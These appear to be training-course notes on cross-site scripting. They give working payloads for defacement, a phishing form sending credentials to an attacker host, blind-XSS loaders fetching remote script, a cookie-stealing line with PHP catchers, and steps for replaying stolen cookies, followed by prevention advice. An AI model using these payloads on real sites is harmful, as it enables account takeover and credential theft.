# XSS

## XSS TYPES

**Stored/Persistent** — saved server-side, fires for every visitor on load. Most critical, zero delivery effort needed. **Reflected/Non-Persistent** — bounces through the backend once, echoed back unsanitized, never saved. Delivery = crafted link. **DOM-based/Non-Persistent** — pure client-side, backend never sees it. Tell: no HTTP request fires in the Network tab when you test it.

All three are stuck inside the browser's JS engine, same-origin sandboxed — no system-level exec unless chained with an actual browser 0-day. Low impact + XSS being everywhere = medium risk in most report templates.

## STORED XSS

```html
<script>alert(window.origin)</script>
```

`window.origin` over a static value — tells you which origin actually fired, matters if the form's sitting inside a cross-domain iframe.

If `alert()` gets blocked:

```html
<plaintext>
```

kills rendering from that point on, dumps the rest raw.

```html
<script>print()</script>
```

print dialog — basically unblockable.

Refresh to confirm persistence. Fires again without resubmitting = stored. `CTRL+U`, check the raw `<script>` landed unescaped.

## REFLECTED XSS

Same payload, no persistence — echoed once in the response, gone on refresh.

GET request → payload rides the URL:

```
http://<TARGET_IP>:<PORT>/index.php?task=<script>alert(window.origin)</script>
```

POST → need a self-submitting form hosted somewhere, can't just hand over a link.

## DOM XSS

Test: submit input, check Network tab (`CTRL+SHIFT+I`). Nothing fires = DOM. Param often sits after a `#` (fragment — never leaves the browser). `CTRL+U` won't show your injection (static base HTML); use Inspector (`CTRL+SHIFT+C`) for the live DOM instead.

Source = wherever JS reads the input. Sink = wherever JS writes it into the page. Unsanitized sink, you're in.

Vanilla sinks:

```
document.write()
DOM.innerHTML
DOM.outerHTML
```

jQuery: `add()`, `after()`, `append()`.

Typical vulnerable setup:

```javascript
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

`innerHTML` strips `<script>` tags on its own — not a security fix, just browser behavior, route around it:

```html
<img src="" onerror=alert(window.origin)>
```

Empty `src` = guaranteed fail = `onerror` fires. Deliver via fragment:

```
http://<TARGET_IP>:<PORT>/#task=<img src='' onerror=alert(window.origin)>
```

## XSS DISCOVERY

### AUTOMATED

Burp Pro / ZAP / Nessus — passive scan reads client-side code for DOM sinks, active scan injects and checks reflections. Free tier: XSStrike, BruteXSS, XSSer.

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://<TARGET_IP>:<PORT>/index.php?task=test"
```

### MANUAL

Payload lists — pull from these, don't write from scratch: PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings payload-box: https://github.com/payloadbox/xss-payload-list

Most payloads target a specific injection context (breaking out of quotes, evading a filter, img/CSS vector vs raw script tag) — expect most to just fail on any given target, that's normal. Don't skip headers — `User-Agent`, `Cookie` — count if they ever get reflected anywhere on the page.

### CODE REVIEW

Most reliable option. Trace source → sink through both ends of the stack, write a payload for exactly how it's handled instead of spraying generic lists.

## DEFACING

Requires Stored XSS — has to stick for anyone visiting.

```javascript
document.body.style.background   // bg color
document.body.background          // bg image
document.title                    // title
DOM.innerHTML                     // page text
```

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://<IMAGE_URL>"</script>
<script>document.title = 'HackTheBox Academy'</script>
```

Full body swap — test the HTML locally first, minify to one line before firing:

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1></center>'</script>
```

Stack them, they all fire independently.

## PHISHING

```html
<h3>Please login to continue</h3>
<form action=http://<OUR_IP>>
<input type="username" name="username" placeholder="Username">
<input type="password" name="password" placeholder="Password">
<input type="submit" name="submit" value="Login">
</form>
```

Inject through `document.write()`, minified:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://<OUR_IP>>...</form>');
```

Kill the real form so yours is the only option — grab its ID with `CTRL+SHIFT+C`:

```javascript
document.getElementById('urlform').remove();
```

Comment out whatever HTML trails after your payload: `<!--` at the end, done.

Netcat catches creds but leaves the victim staring at a broken connection:

```bash
sudo nc -lvnp 80
```

PHP listener does it properly — logs then bounces them back to the real page like nothing happened:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://<TARGET_IP>/<PATH>");
    fclose($file);
    exit();
}
?>
```

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
vi index.php
sudo php -S 0.0.0.0:80
```

## SESSION HIJACKING (BLIND XSS)

Blind = it fires somewhere you can't see — admin panel, review queue. Usual suspects: contact forms, reviews, user details, support tickets, even the `User-Agent` header.

Figure out which field's vulnerable by naming the callback after the field:

```html
<script src="http://<OUR_IP>/username"></script>
```

Don't bother testing email (validated both ends, basically always) or password (hashed, never comes back in clear). Rotate through these per field — injection context changes what lands (PayloadsAllTheThings):

```html
<script src=http://<OUR_IP>></script>
'><script src=http://<OUR_IP>></script>
"><script src=http://<OUR_IP>></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://<OUR_IP>\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//<OUR_IP>");a.send();</script>
<script>$.getScript("http://<OUR_IP>")</script>
```

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Once you've got a working field + payload, swap the callback for a cookie grab:

```javascript
new Image().src='http://<OUR_IP>/index.php?c='+document.cookie
```

Image request over `document.location=` — looks incidental instead of a redirect. Host as `script.js`:

```html
<script src=http://<OUR_IP>/script.js></script>
```

PHP catcher, one line per victim:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Replay: victim's login page, Storage tab (`SHIFT+F9` Firefox), add the cookie manually — Name before the `=`, Value after — refresh, you're in as them.

## XSS PREVENTION

### FRONT-END

Validate input format client-side (regex). Sanitize with DOMPurify (https://github.com/cure53/DOMPurify):

```html
<script type="text/javascript" src="dist/purify.min.js"></script>
```

```javascript
let clean = DOMPurify.sanitize(dirty);
```

Never let raw input touch `<script></script>`, `<style></style>`, tag/attribute fields, or HTML comments. Stay away from raw-write sinks entirely: `DOM.innerHTML`, `DOM.outerHTML`, `document.write()`, `document.writeln()`, `document.domain` — jQuery: `html()`, `parseHTML()`, `add()`, `append()`, `prepend()`, `after()`, `insertAfter()`, `before()`, `insertBefore()`, `replaceAll()`, `replaceWith()`.

### BACK-END

Front-end validation means nothing on its own — trivial to bypass with a raw GET/POST, mirror it server-side:

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) { /* ok */ } else { /* reject */ }
```

PHP sanitization:

```php
addslashes($_GET['email'])
```

Node — DOMPurify again:

```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

Output encoding so input can display without executing (`<` → `&lt;`) — PHP:

```php
htmlentities($_GET['email']);
```

Node (`html-entities`):

```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```

### SERVER CONFIG

HTTPS everywhere, `X-Content-Type-Options: nosniff`, `Content-Security-Policy: script-src 'self'`, `HttpOnly` + `Secure` cookie flags (HttpOnly alone kills cookie theft via XSS specifically), WAF in front, framework-level protection where it exists (ASP.NET has it built in).
